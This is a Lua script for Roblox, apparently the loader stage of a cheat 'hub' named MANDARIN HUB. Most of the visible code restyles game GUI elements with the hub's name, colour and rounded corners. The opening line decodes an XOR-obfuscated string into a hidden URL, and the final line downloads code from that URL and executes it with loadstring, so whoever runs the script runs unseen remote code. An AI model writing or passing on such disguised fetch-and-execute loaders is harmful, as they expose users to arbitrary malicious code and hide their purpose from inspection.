
--[[ STAGE 2: VISUAL CORE ]]
local wjSYK6tx9Z8n4="\077\098\099\104\102\160\140\141\107\093\104\146\090\089\111\092\112\100\114\117\100\120\104\093\095\122\106\098\125\164\112\101\104\167\105\105\107\121\110\119\112\125\113\141\125\179\129\146\124\131\124\145\136\126\127\189\128\141\134\130\194\099\131\117\116\141\138\150\138\166\124\137\173\153\154\156\130\145\174\163\151\178\178\155\153\184\162\159\168\134\186\174\146\159\164\191\195\179\178\153\008\181\181\010\184\007\187\007\243\182\206\195"local U4_cGZdKef_WPm=207 local UDAAyDUKj_nCIDs8c8G=162 local pM2rdR5_e7PvJnCsM4Jl9V=0 local dvDXabU9gNtYbNwxtc=1 local H_IbXT_OCNAc_E=3 local Yz4ysvRPXMPy=false local gPGY82xYa9jklo=bit32 and bit32.bxor if not gPGY82xYa9jklo then gPGY82xYa9jklo=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local fi9lek4jEhlYIyEUq3vJA={}for E5l8_VZlgXms6tXg6=1,#wjSYK6tx9Z8n4 do local F55v7Xa0rhZrBXgyi2apRr=string.byte(wjSYK6tx9Z8n4,E5l8_VZlgXms6tXg6)local ntQwvzX1EIlPXoIltgu=(UDAAyDUKj_nCIDs8c8G+(E5l8_VZlgXms6tXg6*dvDXabU9gNtYbNwxtc)+H_IbXT_OCNAc_E)%256 if pM2rdR5_e7PvJnCsM4Jl9V==0 then F55v7Xa0rhZrBXgyi2apRr=(F55v7Xa0rhZrBXgyi2apRr-ntQwvzX1EIlPXoIltgu)%256 fi9lek4jEhlYIyEUq3vJA[E5l8_VZlgXms6tXg6]=string.char(gPGY82xYa9jklo(F55v7Xa0rhZrBXgyi2apRr,U4_cGZdKef_WPm))else F55v7Xa0rhZrBXgyi2apRr=gPGY82xYa9jklo(F55v7Xa0rhZrBXgyi2apRr,U4_cGZdKef_WPm)fi9lek4jEhlYIyEUq3vJA[E5l8_VZlgXms6tXg6]=string.char((F55v7Xa0rhZrBXgyi2apRr-ntQwvzX1EIlPXoIltgu)%256)end end local peK7kF6uySl75ZTMnaE_=table.concat(fi9lek4jEhlYIyEUq3vJA)if Yz4ysvRPXMPy then peK7kF6uySl75ZTMnaE_=string.reverse(peK7kF6uySl75ZTMnaE_)end local dBJsPT5DTMxpdMI6pyTVs=peK7kF6uySl75ZTMnaE_
local HubName = "MANDARIN HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(dBJsPT5DTMxpdMI6pyTVs))()
